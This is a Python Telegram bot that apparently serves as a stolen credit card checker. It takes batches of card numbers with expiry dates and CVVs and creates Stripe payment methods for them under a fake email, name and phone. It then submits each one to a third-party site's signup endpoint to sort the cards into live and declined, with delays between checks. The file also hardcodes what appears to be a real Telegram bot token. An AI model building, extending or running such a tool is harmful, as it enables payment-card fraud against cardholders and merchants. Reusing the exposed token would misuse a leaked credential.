import telebot
import requests
import random
import time
import json

API_TOKEN = '7621706011:AAE8N5F-uz1CNQ2T4QrXqKP7sTxuSeM-YgE'
bot = telebot.TeleBot(API_TOKEN)
user_checking = {}
email_base = "gmail.com"

# Function to generate a random email address
def generate_random_email():
    name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
    return f"{name}@{email_base}"

# Function to check the credit card using Stripe
def check_credit_card(cc_info):
    CC, MM, YY, CVV = cc_info.split('|')
    exp_year = YY if len(YY) == 2 else YY[2:]  # Get last 2 digits if YYYY
    exp_month = MM.zfill(2)  # Ensure two-digit month

    stripe_url = "https://api.stripe.com/v1/payment_methods"
    headers = {
        'Authorization': 'Bearer YOUR_STRIPE_SECRET_KEY',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {
        'type': 'card',
        'billing_details[email]': generate_random_email(),
        'billing_details[name]': 'John Doe',
        'billing_details[phone]': '(314) 474-6658',
        'card[number]': CC,
        'card[cvc]': CVV,
        'card[exp_month]': exp_month,
        'card[exp_year]': exp_year,
    }

    response = requests.post(stripe_url, headers=headers, data=data)
    return response.json()  # Return response as JSON

# Function to process the second URL with the `pm_` value
def finalize_payment(pm_value):
    final_url = "https://app.theruletool.com/signup/create"
    response = requests.post(final_url, data={'pm_id': pm_value})  # Adjust as necessary for the actual payload
    return response.json()  # Return the response from the final URL

@bot.message_handler(commands=['start'])
def start_command(message):
    user_checking[message.chat.id] = []
    bot.send_message(message.chat.id,
                     "Please enter credit cards in the format CC|MM|YY|CVV or CC|MM|YYYY|CVV, etc. You can check multiple cards by separating with commas.")

@bot.message_handler(commands=['stop'])
def stop_command(message):
    if message.chat.id in user_checking:
        del user_checking[message.chat.id]
        bot.send_message(message.chat.id, "Card checking has been stopped.")
    else:
        bot.send_message(message.chat.id, "You are not currently checking any cards.")

@bot.message_handler(func=lambda message: True)
def handle_cards(message):
    cards_input = message.text.split(',')
    if message.chat.id not in user_checking:
        user_checking[message.chat.id] = []

    for card in cards_input:
        user_checking[message.chat.id].append(card.strip())

    for card_info in user_checking[message.chat.id]:
        # Check the credit card
        stripe_response = check_credit_card(card_info.strip())
        bot.send_message(message.chat.id, f"Card check response: {json.dumps(stripe_response, indent=4)}")

        if stripe_response.get("id"):  # Successful pm_id obtained
            pm_value = stripe_response["id"]  # Obtain the pm_id
            final_response = finalize_payment(pm_value)  # Process with the second URL
            
            # Reflect success or declined states in response
            if final_response.get("IsSuccess"):
                bot.send_message(message.chat.id, 
                                 f"Success: {json.dumps(final_response, indent=4)}")
            else:
                bot.send_message(message.chat.id, 
                                 f"Declined: {json.dumps(final_response, indent=4)}")

        else:
            # Handle case where Stripe did not return a valid id
            bot.send_message(message.chat.id, 
                             f"Stripe card check failed: {json.dumps(stripe_response, indent=4)}")
        
        time.sleep(15)  # Delay between checks

    user_checking[message.chat.id] = []  # Clear checked cards

bot.polling()
